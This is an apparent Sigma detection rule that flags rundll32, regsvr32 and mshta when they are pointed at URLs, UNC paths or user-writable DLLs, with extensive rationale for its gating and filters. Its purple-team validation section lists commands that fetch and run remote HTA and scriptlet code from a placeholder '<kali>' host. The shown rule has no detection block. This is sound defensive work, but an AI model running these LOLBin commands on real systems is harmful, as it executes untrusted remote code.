title: LOLBin proxy execution - rundll32/regsvr32/mshta with an attacker-controlled target (T1218)
id: b6a43bc4-baf4-4777-b892-4fe891b53a02
status: experimental
description: |
  Detects system-binary proxy execution: a signed Microsoft binary - rundll32, regsvr32 or
  mshta - running code the attacker supplied. The binary is not the signal; every Windows
  host runs rundll32 and regsvr32 all day from installers, Control Panel and svchost. The
  invariant is WHAT IT IS POINTED AT: a URL or scriptlet (regsvr32 /i:http, rundll32
  url.dll,OpenURL, mshta http), a UNC path, or a DLL staged in a user-writable directory.
  None of those is where Windows or a vendor keeps the DLLs these binaries legitimately
  load.
  Detection posture: high on the gated arms. rundll32 and regsvr32 are ANDed with a
  co-occurring attacker-controlled target - the gating #351 put on the 4698 LOLBin arm
  after a bare `\rundll32.exe` fired at high on an OEM display-calibration task - so the
  bare binary name is deliberately NOT an arm here. mshta is bare, as it is there: an
  estate that ships no HTA tooling has no routine mshta, and one that does quiets it by
  parent in filter_vendor_installers rather than by weakening the arm. That filter matches
  the parent's FULL PATH, never its basename: an endswith on the name would let anything
  renamed vendor-installer.exe in a user-writable directory silence every arm at once
  (review finding on dotgibson/dotfiles-Defense#365), and the parent-bypass fixture holds
  exactly that shape open as a true positive. Prefer parents under Program Files or
  Windows; an exact path under a user-writable directory is the weaker form, since the
  account the attacker already holds can plant a binary at it.
  `http` is anchored on the SCHEME (`http://`, `https://`), not on a leading delimiter the
  way the 4698 rule anchors it. A command line has no ambient `http` the way 4698's
  TaskContent carries its xmlns root, but System32 ships winhttp.dll and httpapi.dll, and
  `regsvr32 /s winhttp.dll` is a real installer step: a bare `http` would make that fire,
  and a URL cannot be a DLL name. `\Users\` and `\Temp\` live ONLY inside the AND, for the
  reason scheduled_task_suspicious_4698.yml gives for dropping them from its bare OR:
  per-user updaters register from those paths at volume, and a path match that common
  turns a high-severity rule into a mute button.
  Channel: generic `category: process_creation` so it matches both Security-4688 and
  Sysmon-1 - it names only Image, CommandLine and ParentImage, which both channels carry
  (under the windows-audit pipeline Image maps to NewProcessName and ParentImage to
  ParentProcessName). 4688 needs "Include command line in process creation events" on top
  of Audit Process Creation, or the CommandLine arm never sees its target.
  This is the EXECUTION plane of LOLBins the corpus already names inside persistence
  artifacts: scheduled_task_suspicious_4698.yml (id 8ae44ad2-6331-4444-97f4-b2eac893717c)
  sees them in task XML, registry_run_key_suspicious_target_sysmon_13.yml in Run values,
  wmi_event_subscription_consumer.yml in consumer command lines and
  service_creation_psexec_7045.yml in ImagePath. Those fire on the REGISTRATION; this
  fires when the binary runs, which is also the only plane that sees the interactive,
  one-shot use - a scriptlet pulled once from an operator's shell - that registers nothing.
  Scope: one rule per gating shape. MSBuild (its own technique upstream, T1127.001),
  msiexec, odbcconf, CMSTP and InstallUtil each need their own target gating and are
  deliberately not folded in; the rest of TA0005 (masquerading, obfuscation, injection)
  stays unstarted and DEFENSE-METHODOLOGY.md says so. First rule in stealth/, written for
  the gap dotgibson/dotfiles-Defense#352 ranked; gating pattern from
  dotgibson/dotfiles-Defense#351.
  Validate (purple): on a lab host run `rundll32 url.dll,OpenURL http://<kali>/x.hta`,
  `regsvr32 /s /n /u /i:http://<kali>/x.sct scrobj.dll` and `mshta http://<kali>/x.hta`
  from dotfiles-Offense. The htpx corpus has no entry for this one - its blue entries name
  these binaries only inside schtask-4698 and wmi-subscription-sysmon, both registration
  planes.
  Requires the Process Creation audit subcategory (4688, with command line) or Sysmon
  EventID 1.
references:
  - https://attack.mitre.org/techniques/T1218/011/
  - https://attack.mitre.org/techniques/T1218/010/
  - https://attack.mitre.org/techniques/T1218/005/
  - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
author: dotfiles-Defense
date: 2026-10-14
modified: 2026-10-14
tags:
  - attack.stealth
  - attack.t1218.005
  - attack.t1218.010
